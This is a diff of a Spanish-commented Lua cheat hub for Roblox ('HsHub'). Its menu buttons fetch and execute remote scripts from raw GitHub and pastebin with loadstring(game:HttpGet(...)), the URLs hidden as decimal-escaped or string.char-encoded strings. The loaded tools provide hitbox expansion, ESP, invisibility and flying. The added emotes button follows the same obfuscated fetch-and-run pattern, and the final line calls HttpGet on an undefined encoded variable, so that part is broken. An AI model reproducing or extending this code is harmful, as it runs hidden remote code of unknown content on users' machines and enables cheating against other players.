@@ -2,7 +2,7 @@ local _v1,_v2,_v3,_v4,_v5,_v6,_v7=game:GetService("Players"),game:GetService("Us
 local _v8 = _v1.LocalPlayer
 local _v9 = loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,70,111,111,116,97,103,101,115,117,115,47,87,105,110,100,85,73,47,109,97,105,110,47,100,105,115,116,47,109,97,105,110,46,108,117,97)))()
 -- MOTOR DE SEGURIDAD Y ENRUTAMIENTO DE INTERFAZ
--- ==========================================
+-- =====================================================================
 local function GetSecureContainer()
     if gethui then
         return gethui()
@@ -144,36 +144,24 @@ local _w1=_v9:CreateWindow({
         StrokeThickness=2,
         Enabled=true,
         Draggable=true,
-        Scale=0.8,       Color=ColorSequence.new(Color3.fromHex("#ffff00"),Color3.fromHex("#ffff00"))
+        Scale=0.8,
+        Color=ColorSequence.new(Color3.fromHex("#ffff00"),Color3.fromHex("#ffff00"))
     }
 })
 _w1:SetToggleKey(Enum.KeyCode[_s1.UI.K])
--- Botón interactivo para "V desconectando"
-_tb3:Button({
-    Title = "V desconectando",
-    Desc = "Haz clic para ejecutar esta función", -- Texto secundario que ayuda al usuario
-    Icon = "lucide:braces",
+_w1:Tag({
+    Title = "Defensas",
+    Icon = "solar:shield-bold",
     Color = Color3.fromHex("#696969"),
-    Callback = function()
-        -- Todo el código dentro de esta función se ejecuta al hacer clic
-        print("Ejecutando V desconectando...")
-        -- Ejemplo: loadstring(game:HttpGet("TU_LINK_AQUI"))()
-    end
+    Border = true
 })
 
--- Botón interactivo para "Admin"
-_tb3:Button({
-    Title = "Admin",
-    Desc = "Haz clic para cargar el panel de administrador",
+_w1:Tag({
+    Title = "extensiones",
     Icon = "lucide:panda",
     Color = Color3.fromHex("#8c00ff"),
-    Callback = function()
-        -- Inserta aquí la lógica de tu script de administrador
-        print("Ejecutando Admin...")
-        -- Ejemplo: loadstring(game:HttpGet("TU_LINK_AQUI"))()
-    end
+    Border = false
 })
---rainbow borde
 task.spawn(function()
     task.wait(2)
     local uiContainer = GetSecureContainer()
@@ -195,8 +183,8 @@ task.spawn(function()
     end
 
     if targetStroke then
-local colorYellow = Color3.fromRGB(255, 255, 0)
-local colorBlack = Color3.fromRGB(0, 0, 0)
+        local colorYellow = Color3.fromRGB(255, 255, 0)
+        local colorBlack = Color3.fromRGB(0, 0, 0)
 
         game:GetService("RunService").RenderStepped:Connect(function()
             local alpha = (math.sin(tick() * 3) + 1) / 2
@@ -273,6 +261,7 @@ _tb4:Keybind({Title="UI Toggle Keybind",Desc="Tecla para ocultar o mostrar el me
 _tb4:Toggle({Title="Mover Botón DASH",Desc="Permite mover el botón DASH de forma táctil",Value=_s1.MB.D,Callback=function(s) _s1.MB.D=s end})
 
 local _tb3=_w1:Tab({Title="Scripts",Icon="solar:code-bold"})
+_tb3:Button({Title="🤑Cargar Emotes",Desc="Abre el menú de emotes universales",Color=Color3.fromRGB(255,165,0),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\55\121\100\55\47\72\117\98\47\114\101\102\115\47\104\101\97\100\115\47\66\114\97\110\99\104\47\71\85\73\83\47\69\109\111\116\101\115\46\108\117\97"))() end})
 _tb3:Button({Title="🗳️compuesto A-G-H v6 HS",Desc="Es una hitbox mejorada talvez mejor ke eso😼☝️",Color=Color3.fromRGB(160,32,240),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\71\89\115\53\115\120\68\84"))() end})
 _tb3:Button({Title="👁️Activar Visuales HS",Desc="Abre el menú separado de ESP y Chams",Color=Color3.fromRGB(255,100,0),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\107\54\69\68\97\65\113\112"))() end})
 _tb3:Button({Title="⌛A-R-T scrimer HS",Desc="un arma para darle un levanton al rival 😼💥",Color=Color3.fromRGB(46,204,113),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\109\104\116\50\107\99\78\67"))() end})
@@ -280,9 +269,9 @@ _tb3:Button({Title="💥gema de la realidad",Desc="altera la realidad te cambia 
 _tb3:Button({Title="🛩️HS Flayers",Desc="pa ke vuelen alto mis panas esto funciona en otros juegos también",Color=Color3.fromRGB(37,122,247),Callback=function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\85\65\88\103\65\112\89\89"))() end})
 _tb3:Button({Title="👻invisibles y otras variantes 👻💥",Desc="es una mini biblioteca que contiene variantes de invisible",Color=Color3.fromRGB(255,255,0),Callback=function() local _g,_l=game,loadstring;local _u=string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,104,109,101,97,84,68,53,67);_l(_g:HttpGet(_u))() end})
 -- DETECTOR DE DESTRUCCIÓN SEGURO (LIMPIEZA TOTAL AL USAR LA 'X')
--- =========================================
+-- =====================================================================
 task.spawn(function()
-    task.wait(3)
+    task.wait(2)
 
     local uiContainer = GetSecureContainer()
     local mainGui = nil
@@ -317,4 +306,4 @@ task.spawn(function()
         warn("[HsHub] Búsqueda Segura Activa: No se pudo anclar la limpieza automática.")
     end
 end)
-loadstring(game:HttpGet(string.char(xsensual)))()
+loadstring(game:HttpGet(string.char(pruebasenssor)))()
